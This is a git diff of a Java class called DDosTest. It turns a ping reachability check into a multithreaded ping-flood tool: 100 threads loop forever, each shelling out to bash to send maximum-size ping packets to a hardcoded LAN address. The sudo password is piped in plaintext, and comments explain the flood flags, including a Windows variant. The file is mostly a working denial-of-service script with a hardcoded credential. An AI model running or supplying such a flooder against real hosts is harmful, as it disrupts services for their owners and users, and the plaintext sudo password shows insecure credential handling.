@@ -1,14 +1,10 @@
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.net.URLEncoder;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.io.*;
-import java.net.*;
 
 public class DDosTest {
 
-    public static void main(String... args)   {
-        for (int i = 0; i < 10000; i++) {
+    public static void main(String... args) {
+        //Create and start 100 threads
+        for (int i = 0; i < 100; i++) {
             DdosThread thread = new DdosThread();
             thread.start();
         }
@@ -16,34 +12,46 @@ public class DDosTest {
 
     public static class DdosThread extends Thread {
 
+        //Threadsafe boolean
         private AtomicBoolean running = new AtomicBoolean(true);
 
+        //Change run so that it may continue to ping infinitely until the boolean is set to false
         @Override
         public void run() {
             while (running.get()) {
                 try {
-                    attack();
+                    /*Unix specific command prompt - requires superuser to specify the size of the packet being sent,
+                    thus the system password is currently hardcoded
+                    -s sends a 65507 byte pack, the maximum allowed size for Unix/MacOS
+                    -f continuously sends pings without waiting for a reply
+                    Java implementation of ping does not allow for altering of packet size / flooding, so we use bash
+                     */
+                    String ipAddress = "192.168.1.117";
+                    String[] cmd = {"/bin/bash", "-c", "echo testPass| sudo -S ping " + ipAddress + "  -s 65507"};
+
+                    /*Equivalent ping command for Windows
+                    -t sends pings until the process is stopped
+                    -l sets the buffer size
+                    -f continuously sends pings without waiting for a reply
+                     */
+                    //String[] cmd = "ping " + ipAddress + " -f -t -l 65500";
+                    attack(cmd);
                 } catch (Exception e) {
 
                 }
             }
         }
 
-        public void attack() throws Exception {
-            //Hardcoded for testing
-            sendPingRequest("192.168.1.71");
+        private static void attack(String[] cmd) throws Exception {
+            /*Run command and wait -- ping command on Windows set to run infinitely (MacOS does this by default), thus
+            the process will never exit on the waitFor call, allowing the infinite loop
+             */
+            Runtime rt = Runtime.getRuntime();
+            Process p = rt.exec(cmd);
+            p.waitFor();
         }
     }
-
-    // Sends ping request to a provided IP address
-    public static void sendPingRequest(String ipAddress)
-            throws IOException
-    {
-        InetAddress geek = InetAddress.getByName(ipAddress);
-        System.out.println("Sending Ping Request to " + ipAddress);
-        if (geek.isReachable(5000))
-            System.out.println("Host is reachable");
-        else
-            System.out.println("Sorry ! We can't reach this host");
-    }
 }
+
+
+
